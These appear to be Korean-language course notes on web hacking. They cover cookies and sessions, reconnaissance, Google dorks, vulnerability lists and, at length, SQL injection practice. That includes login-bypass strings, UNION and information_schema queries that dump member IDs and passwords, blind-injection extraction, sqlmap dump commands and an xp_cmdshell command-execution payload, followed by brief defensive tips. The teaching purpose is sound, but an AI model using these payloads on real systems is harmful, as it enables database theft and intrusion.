Cookie
클라이언트에 저장되어 서버에서 활용하는 상태정보

Persistent Cookie
디스크에 저장
초기 접속시 전송
Expiration date가 지나거나 Cookie 삭제시 만료
사용자 재방문시 속성등을 저장(팝업창 제한, ID/PWD, 장바구니 등)


Session Cookie
브라우저 메모리 공간에 저장
초기 접속시 전송되지 않음
브라우저를 종료하거나 set-cookie로 cookie가 클리어시 만료
사용자 접속시 인증정보유지를 위하여 사용


Set-Cookie : 쿠키이름:쿠키값;Exipires=날짜;Path=경로;Secure,HttpOnly

--------------------------------------------------------
세션 : 연결된 상태를 뜻하는 네트워크 용어
         정보를 서버에 저장

세션ID(세션식별자)
------------------------------------------------------------------

인터넷 익스플로러 : cooxie toolbar
크롬 브라우저 : editthiscookie


Cookie: ASPSESSIONIDASTRRTSS=CAKBMHJBFIDBGDHHFOJEACHA

---------------------------------
웹 해킹

공격대상 선정 - 정보수집 - 취약점 분석 - 공격 - 보고서

whois
archive.org
netcraft.com  wappalyzer

------------------
크롤링
웹서핑
개발자도구

--------------------------------------------------
구글 해킹 (구글링 잘하는 방법)

site: 특정 도메인으로 지정한 사이트에서 검색하려는 문자열이 포함된 사이트를 찾음
filetype: 특정파일 타입에 한해서 검색하려는 문자가 들어있는 사이트를 찾음
link: 링크에 검색하려는 문자가 들어있는 사이트를 찾음
cache: 특정 검색어에 해당하는 캐쉬된 페이지를 보여줌
intitle: 페이지의 제목에 검색하려는 문자가 들어 있는 사이트를 찾음
inurl: 페이지의 url에 검색하려는 문자가 들어있는 사이트를 찾음
intext: 페이지의 text안에서 검색하려는 문자가 들어있는 사이트를 찾음


intilte:index.of  :디렉터리 리스팅 취약점을 점검 구문

https://m.blog.naver.com/PostView.nhn?blogId=bestheroz&logNo=106775695&proxyReferer=https:%2F%2Fwww.google.co.kr%2F


intilte:index.of 영화

db_conn.inc site:co.kr

https://www.exploit-db.com/google-hacking-database

문의 inurl:modify.asp

site:naver.com inurl:admin

robots.txt
----------------------------------------------------------
취약점 리스트 :

대표적인 취약점 리스트

CWE
미국국방성 산하 Mitre라는 기관에서 일반적으로 널리 통용되는 주요 취약점, 보안상의 문제들을 나열하여 정리한 목록
cwe.mitre.org

CVE
MITRE 및 몇몇 벤더사(MS,GOOGLE,CISCO,APPLE 등등)등이 함께 시간에 따라 감지된 보안취약점 또는 위험노출을 정리해둔 목록

표기방식 : CVE + 취약점이 발견된 년도 + 취약점 고유번호

cve.mitre.org     

OWASP TOP 10

OWASP : 웹 어플리케이션 보안에 대한 자발적인 온라인 정보 공유 민간단체 사이트

OWASP에서 3년주기로 10대 취약점을 발표, CVE를 기반해서

-------------------------------------------------
국내
국정원 8대취약점
행안부 안전가이드
시큐어코딩 가이드
주요기반시설취약점진단가이드
-----------------------------------------
해킹기술 실습   
SQL 인젝션
 -> 웹 어플리케이션이 데이터베이스에 날리는 SQL을 개발자가 의도하지 않은 형태로 조작하여 공격하는 기법

<간단한 논리적 취약점을 이용한 SQL 인젝션 실습>

select * from member where id='사용자입력id' and pwd='사용자입력pwd';

id : ' or '1'='1'--
     ' or 1=1--

-- : oracle, MSSQL의 주석처리
# : MYSQL의 주석처리

select * from member where id='' or '1'='1'--

http://coashanee5.blogspot.com/2017/02/sql.html


select * from member where (id='' and pwd='');

' or 1=1)--

------------------------
특정사용자로 로그인시도.

attacker'--
1111'--

select * from member where id='attacker'--

=========================================
<에러기반 SQL 인젝션)
-> 응답 에러메시지를 통해 정보를 획득하여 공격하는 SQL 인젝션 공격 기법

' and db_name()=0--  db 이름 알아내기
' and @@version=0--    dbms 버전정보 알아내기
' and @@servicename=0--   dbms 서비스 이름 알아내기

---------------------------------------
having 구문과 group by 구문을 이용한 SQL 인젝션

' having 1=1--
-> 에러발생 및 DB테이블이름(chpater1), 컬럼명(idx) 획득)

' group by chapter1.idx--
->chapter1.level_idx 획득

' group by chapter1.idx, chapter1.level_idx--
-> chapter1.ref_idx 획득

' group by chapter1.idx, chapter1.level_idx, chapter1.ref_idx--
---------------------------------------------
chapter1
idx, level_idx, ref_idx, title, name, wtday, hitcnt

member
m_idx, m_id, m_name          
---------------------------------------------------------
<UNION SQL Injection)
-> Union 구문을 사용하면 테이블 두 개의 내용이 동시에 출력가능하고 이를 통해 공격자가 알고 있는 DB의 테이블 데이터를 조회하여 출력할 수 있다.

UNION SQL Injection의 조건
1. UNION으로 연결할 양쪽의 컬럼갯수가 같아야 한다.
2. 같은 위치의 컬럼의 타입이 다를 경우 에러가 발생할 수 있다.
3. 컬럼의 이름이 정확해야 한다.

--------------------------------------------------
' union select NULL,NULL,NULL,NULL,NULL,NULL,NULL from member--

' union select 1,1,1,1,1,1,1 from member--

' union select 1,1,1,NULL,NULL,NULL,NULL from member--

' union select 1,1,1,NULL,NULL,NULL,NULL from member--


' union select 1,1,1,m_id,m_name,NULL,NULL from member--

' union select 1,1,1,m_id,m_name,NULL,NULL from member where m_id > 'b'--

' union select 1,1,1,m_id,m_pwd,NULL,NULL from member--

--------------------------------------------------------------
<information_schema를 사용한 SQL 인젝션 공격기법>

-> MYSQL, MSSQL 의 경우 information_schema 데이터베이스에 전체 DB의 정보가 저장됨.
->information_schema.columns 테이블을 조회할 경우 전체DB의 테이블명, 컬럼명을 조회할 수 있음(table_name, column_name)
-> union select에 information_schema.columns의 항목을 포함시켜 DB정보 파악

' union select 1,1,1,table_name,column_name,NULL,NULL from information_schema.columns--
-> 테이블 명, 컬럼 명 출력

' union select 1,1,1,table_name,NULL,NULL,NULL from information_schema.columns--

-> 테이블 명만 출력
-> member 테이블 확인

' union select 1,1,1,column_name,NULL,NULL,NULL from information_schema.columns where table_name='member'--

-> member 테이블의 필드명 확인
-> 테이블, 필드명 확인이 끝났으므로 획득한 정보를 이용하여 union sql 인젝션 공격을 수행한다.

' union select 1,1,1,m_id,m_pwd,NULL,NULL from member--
------------------------------------------------------------
<blind SQL Injection>
정의 : 쿼리 결과(참,거짓)에 따라 정보를 획득하여 공격하는 기법

attacker' and 1=1--   -> 로그인 성공

attacker' and 1=2--   -> 로그인 실패
-----------------------------------------

substring('abcdef',1,2);
abcdef 중 ab 반환

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('a')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('l')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('m')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) = ASCII('l')--

l

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),2,1)) >= ASCII('e')--

e

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),3,1)) >= ASCII('a')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),4,1)) >= ASCII('a')--

attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),5,1)) >= ASCII('a')--

lecture

-----------------
> 자동화 툴을 사용한다.

--------------------------------------------------------
실무 팁:

%' and '1%'='1                         %' and '1%'='2
%' and 'a%'='a                         %' and 'a%'='b


' and '1'='1 
' and '1'='1'

------------------------------------------------------------
192.168.195.132:9090
--------------------------------

SQL MAP

sqlmap.org


OS,DBMS
python sqlmap.py -r 1.txt -p keyword

DB 찾기
python sqlmap.py -r 1.txt --dbs -p keyword

테이블 찾기
python sqlmap.py -r 1.txt -D board --tables -p keyword

member

컬럼 찾기
python sqlmap.py -r 1.txt -D board -T member --columns -p keyword

내용 덤프
python sqlmap.py -r 1.txt -D board -T member -C bId,bName,bPass --dump -p keyword

bId,bName,bPass
-----------------------------------------------------------------

Stored Procedure SQL Injection
-> DBMS에서 관리 목적으로 사용되는 Stored Procedure(저장 프로시저)를 공격자가 호출하여 시스템 명령 수행등을 수행할 수 있는 공격

MS-SQL
xp_cmdshell :  관리자 권한으로 시스템명령어를 실행

'; exec master.dbo.xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'--
-----------------------------------------------------
=========================================
데이터 평문 전송  -> burp 사용 금지, 와이어샤크를 사용해야한다!!
http를 써서 중요정보를 전송하면 취약점
중요정보(password, 주민등록번호.....)

-> 해결책: https
------------------------------------------------
자동화 공격

툴을 이용해서 자동화 공격

대응방안 : captcha
               같은 ip에서 여러번 요청 방지
               패스워드 5번이상 틀리면 계정잠금
-----------------------------------
정보누출 취약점

부적절한 에러메시지 처리
마스킹 처리 미흡
값이 이미 하드코딩된 경우
404,403 등 에러페이지가 동일하지 않은 경우
주석처리를 잘하지 못한경우
클라이언트사이드에서 필터링하는 경우

백업파일을 지우지 않은경우, 설치 기본페이지를 지우지않은경우
test.jsp        
download.asp.bak
index.php.bak
zip tar.gz
txt

http 응답 패킷의 배너그래빙
db에러메시지
db에 중요정보를 암호화하지 않고 저장하는 경우

등등등등
















